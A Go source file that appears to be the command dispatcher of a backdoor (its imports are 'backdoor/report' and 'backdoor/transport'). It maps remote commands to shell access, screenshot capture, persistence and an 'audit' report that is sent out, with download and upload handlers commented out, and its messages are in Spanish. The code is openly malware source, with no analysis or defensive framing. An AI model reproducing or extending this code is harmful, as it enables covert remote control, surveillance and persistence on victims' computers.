package handler

import (
	"backdoor/report"
	"backdoor/transport"
	"strings"
)

type CommandHandler func(t transport.Transport)

var Registry = map[string]CommandHandler{
	"shell":       ShellHandler,
	"screen":      ScreenshotHandler,
	"persistence": PersistenceHandler,
	"audit":       AuditHandler,
	// "download": DownloadHandler,
	// "upload":   UploadHandler,
}

func Handle(t transport.Transport) {
	for {
		input, err := t.Read()
		if err != nil {
			return
		}
		command := strings.TrimSpace(string(input))
		if handler, ok := Registry[command]; ok {
			handler(t)
		} else {
			t.Write([]byte("Comando no reconocido\n"))
		}
	}
}

func AuditHandler(t transport.Transport) {
	t.Write([]byte("Generando y enviando reporte de auditoría...\n"))
	if err := report.NewAuditReport(); err != nil {
		t.Write([]byte("Error enviando reporte: " + err.Error() + "\n"))
	} else {
		t.Write([]byte("Reporte enviado correctamente\n"))
	}
}
